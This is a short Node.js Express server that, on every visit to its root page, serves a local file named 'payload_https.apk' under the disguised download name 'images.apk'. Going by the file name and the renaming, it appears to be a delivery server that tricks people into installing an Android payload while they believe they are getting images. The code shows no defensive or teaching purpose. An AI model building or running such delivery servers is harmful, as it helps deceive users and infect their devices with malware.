import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const port = 3000; // You can change the port number if needed

// Resolve __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Path to the APK file
const apkFilePath = path.join(__dirname, "payload_https.apk");

// Route to download the APK file
app.get("/", (req, res) => {
  res.download(apkFilePath, "images.apk", (err) => {
    if (err) {
      console.error("Error occurred while downloading the file:", err);
      res.status(500).send("An error occurred while downloading the file.");
    } else {
      console.log("File downloaded successfully!");
    }
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running at: http://localhost:${port}`);
});
